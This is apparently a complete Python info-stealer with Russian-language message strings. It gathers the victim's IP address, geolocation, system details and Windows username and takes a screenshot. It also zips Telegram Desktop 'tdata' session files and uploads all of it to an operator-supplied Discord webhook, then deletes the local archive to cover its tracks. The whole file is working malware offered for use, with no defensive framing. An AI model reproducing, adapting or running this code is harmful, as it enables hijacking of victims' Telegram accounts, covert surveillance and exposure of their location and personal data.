import requests
import platform
import getpass
import os
import zipfile
import io

from PIL import ImageGrab
from requests_toolbelt import MultipartEncoder

webhook_url = '' # Your webhook

def get_ip_info():
    data = requests.get("https://ipinfo.io/json").json()
    ip = data.get("ip", "не найден")
    city = data.get("city", "неизвестно")
    region = data.get("region", "неизвестно")
    country = data.get("country", "неизвестно")
    loc = data.get("loc", "неизвестно")
    org = data.get("org", "неизвестно")
    postal = data.get("postal", "неизвестно")
    timezone = data.get("timezone", "неизвестно")
    return ip, city, region, country, loc, org, postal, timezone

def get_system_info():
    os_name = platform.system()
    os_version = platform.release()
    pc_name = platform.node()
    processor = platform.processor()
    architecture = platform.machine()
    user = getpass.getuser()
    return os_name, os_version, pc_name, processor, architecture, user

def steal_tg():
    path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
    zip_name = 'grab_tdata.zip'
    user = getpass.getuser()

    def send_discord_message(content):
        try:
            requests.post(webhook_url, data={"content": content})
        except:
            pass

    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
            for entry in os.listdir(path):
                full_path = os.path.join(path, entry)
                if os.path.isfile(full_path) and any(entry.startswith(mask) for mask in ['map', 'map0', 'key_datas']):
                    zf.write(full_path, arcname=entry)

                elif os.path.isdir(full_path) and entry.startswith('D877F'):
                    for dirpath, _, filenames in os.walk(full_path):
                        for filename in filenames:
                            file_path = os.path.join(dirpath, filename)
                            relative_path = os.path.relpath(file_path, path)
                            zf.write(file_path, relative_path)

        try:
            with open(zip_name, 'rb') as f:
                m = MultipartEncoder(fields={
                    'content': f'Grab tdata from PC: {user}',
                    'username': 'Floppa_script',
                    'avatar_url': 'https://i.imgur.com/Zxa5jr2.jpeg',
                    'file': (zip_name, f, 'application/zip')
                })
                headers = {'Content-Type': m.content_type}
                response = requests.post(webhook_url, data=m, headers=headers)
                if response.status_code not in (200, 204):
                    send_discord_message(f"Ошибка отправки архива: {response.status_code}")
        except Exception as e:
            send_discord_message(f"Ошибка при отправке архива: {e}")

    finally:
        if os.path.exists(zip_name):
            try:
                os.remove(zip_name)
            except:
                pass

def screen():
    screenshot = ImageGrab.grab()
    bufer_obmena = io.BytesIO()
    screenshot.save(bufer_obmena, format="PNG")
    bufer_obmena.seek(0)
    screenshot1 = {
        "screenshot1": ("screenshot.png", bufer_obmena, "image/png")
    }
    return screenshot1

def create_message(ip_data, sys_data):
    ip, city, region, country, loc, org, postal, timezone = ip_data
    os_name, os_version, pc_name, processor, architecture, user = sys_data
    message = (
        f"Айпишник: {ip}\n"
        f"Город: {city}\n"
        f"Регион: {region}\n"
        f"Страна: {country}\n"
        f"Координаты: {loc}\n"
        f"Организация: {org}\n"
        f"Почтовый индекс: {postal}\n"
        f"Часовой пояс: {timezone}\n\n"
        f"ОС: {os_name} {os_version}\n"
        f"Имя ПК: {pc_name}\n"
        f"Процессор: {processor}\n"
        f"Архитектура: {architecture}\n"
        f"Имя пользователя Windows: {user}\n"
    )
    return message

def send_to_discord(message, screenshot1):
    data = {
        "content": message,
        "username": "your_name",
        "avatar_url": "your_avatar" # U can delete it
    }
    response = requests.post(webhook_url, data=data, files=screenshot1)

def main():
    ip_data = get_ip_info()
    sys_data = get_system_info()
    screenshot1 = screen()
    stealtg = steal_tg()
    message = create_message(ip_data, sys_data,)
    send_to_discord(message, screenshot1, )
    stealtg

if __name__ == "__main__":
    main()